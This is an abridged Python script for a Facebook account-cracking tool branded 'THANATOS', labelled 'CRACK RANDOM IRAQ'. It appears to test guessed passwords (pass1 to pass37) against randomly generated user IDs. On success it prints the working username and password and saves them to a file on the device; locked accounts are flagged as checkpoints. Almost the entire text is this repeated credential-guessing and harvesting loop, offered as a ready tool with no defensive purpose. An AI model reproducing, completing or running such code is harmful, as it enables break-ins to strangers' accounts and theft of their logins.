...
def menu():
    os.system('clear')
    print logo 
    print '\x1b[1;94m[1]\x1b[1;93m CRACK RANDOM IRAQ'
    action()
...
def action():
    ...
    time.sleep(0.1)
    print('\x1b[1;93mTOOL BY @i4m_THNS')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass1 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass1 + '\n'
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass2 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass3 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass3 + '\n')
                okb.close()
                oks.append(c + user + pass3)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass3 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass4 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass4 + '\n')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass4 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass5 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass5 + '\n')
                okb.close()
                oks.append(c + user + pass5)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass5 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass6 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass6 + '\n')
                okb.close()
                oks.append(c + user + pass6)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass6 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass7 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass8 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass8 + '\n')
                okb.close()
                oks.append(c + user + pass8)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass8 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass9 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass9 + '\n')
                okb.close()
                oks.append(c + user + pass9)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass9 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass10 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass10 + '\n')
                okb.close()
                oks.append(c + user + pass10)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass10 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass11 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass11 + '\n')
                okb.close()
                oks.append(c + user + pass11)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass11 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass12 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass12 + '\n')
                okb.close()
                oks.append(c + user + pass12)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass12 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass13 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass13 + '\n')
                okb.close()
                oks.append(c + user + pass13)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass13 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass14 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass14 + '\n')
                okb.close()
                oks.append(c + user + pass14)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass14 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass15 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass15 + '\n')
                okb.close()
                oks.append(c + user + pass15)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass15 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass16 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass16 + '\n')
                okb.close()
                oks.append(c + user + pass16)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass16 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass17 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass17 + '\n')
                okb.close()
                oks.append(c + user + pass17)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass17 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass18 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass18 + '\n')
                okb.close()
                oks.append(c + user + pass18)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass18 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass19 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass19 + '\n')
                okb.close()
                oks.append(c + user + pass19)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass19 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass20 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass20 + '\n')
                okb.close()
                oks.append(c + user + pass20)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass20 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass21 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass21 + '\n')
                okb.close()
                oks.append(c + user + pass21)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass21 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass22 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass22 + '\n')
                okb.close()
                oks.append(c + user + pass22)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass22 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass23 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass23 + '\n')
                okb.close()
                oks.append(c + user + pass23)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass23 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass24 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass24 + '\n')
                okb.close()
                oks.append(c + user + pass24)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass24 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass25 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass25 + '\n')
                okb.close()
                oks.append(c + user + pass25)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass25 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass26 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass26 + '\n')
                okb.close()
                oks.append(c + user + pass26)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass26 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass27 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass27 + '\n')
                okb.close()
                oks.append(c + user + pass27)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass27 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass28 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass28 + '\n')
                okb.close()
                oks.append(c + user + pass28)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass28 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass29 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass29 + '\n')
                okb.close()
                oks.append(c + user + pass29)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass29 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass30 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass30 + '\n')
                okb.close()
                oks.append(c + user + pass30)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass30 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass31 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass31 + '\n')
                okb.close()
                oks.append(c + user + pass31)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass31 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass32 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass32 + '\n')
                okb.close()
                oks.append(c + user + pass32)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass32 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass33 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass33 + '\n')
                okb.close()
                oks.append(c + user + pass33)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass33 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass34 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass34 + '\n')
                okb.close()
                oks.append(c + user + pass34)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass34 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass35 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass35 + '\n')
                okb.close()
                oks.append(c + user + pass35)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass35 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass36 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass36 + '\n')
                okb.close()
                oks.append(c + user + pass36)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass36 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[THANATOS-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass37 + '\n' + '\n'
                okb = open('/sdcard/save/successfull.txt', 'a')
                okb.write(k + c + user + '--' + pass37 + '\n')
                okb.close()
                oks.append(c + user + pass37)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[THANATOS-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass37 + '\n'
                cps = open('save/checkpoint.txt', 'a')
    ...
    print '[\xe2\x9c\x93]\x1b[1;91m TOOL BY THANATOS'
    raw_input('\n[ ENTER BKA]')
